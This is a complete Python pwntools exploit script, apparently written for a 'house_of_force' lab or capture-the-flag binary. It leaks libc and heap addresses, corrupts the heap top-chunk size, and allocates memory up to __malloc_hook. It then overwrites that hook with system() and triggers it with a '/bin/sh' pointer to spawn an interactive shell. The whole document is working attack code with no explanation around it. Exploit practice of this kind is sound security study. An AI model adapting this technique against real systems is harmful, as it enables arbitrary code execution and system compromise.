from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_force', checksec=False)

libc = elf.libc

environ = {"LD_PRELOAD": libc.path}

gs = """
b *main
b *main+295
b *main+448
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
rcu = lambda data: io.recvuntil(data)
    
def start():
    if args.GDB:
        return gdb.debug(elf.path, env=environ, gdbscript=gs)
    else:
        return process(elf.path)
    
def malloc(size, data):
    rcu(b'> ')
    s(b'1')
    rcu(b'size: ')
    s(f'{size}'.encode())
    rcu(b'data: ')
    s(data)
 
def delta(x, y):
    return (0xffffffffffffffff - x) + y
   
io = start()
io.timeout = 0.1
rcu(b'puts() @ ')
puts_leak = int(io.recvline(), 16) 
rcu(b'heap @ ')
heap_leak = int(io.recvline(), 16)

success(f"puts @ {hex(puts_leak)}")
success(f"heap @ {hex(heap_leak)}")


libc.address = puts_leak - libc.sym['puts']
success(f"libc @ {hex(libc.address)}")
success(f"__malloc_hook @ {hex(libc.sym['__malloc_hook'])}")

distance = libc.sym['__malloc_hook'] - 0x20 - (heap_leak + 0x20)

malloc(24, b'a'*24 + p64(0xffffffffffffffff))
malloc(distance, b'/bin/sh\x00')
malloc(24, p64(libc.sym['system']))

#Option 1
#cmd = heap_leak + 0x30  #the address save "/bin/sh"
#malloc(cmd, b'')

#Option 2
cmd = next(libc.search(b"/bin/sh\x00"))
malloc(cmd, b' ')


io.interactive() 

